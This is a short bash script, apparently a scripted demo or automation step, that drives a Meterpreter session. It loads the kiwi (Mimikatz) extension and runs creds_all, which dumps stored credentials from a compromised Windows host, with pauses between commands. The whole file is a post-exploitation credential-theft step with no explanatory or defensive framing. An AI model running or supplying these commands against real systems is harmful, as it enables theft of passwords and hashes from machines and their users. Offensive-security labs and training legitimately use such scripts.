#!/bin/bash

: '
meterpreter: show creds_all (mimikatz)
'

execute_command "load kiwi"
create_new_line
sleep 1

execute_command "creds_all"
create_new_line
sleep 1
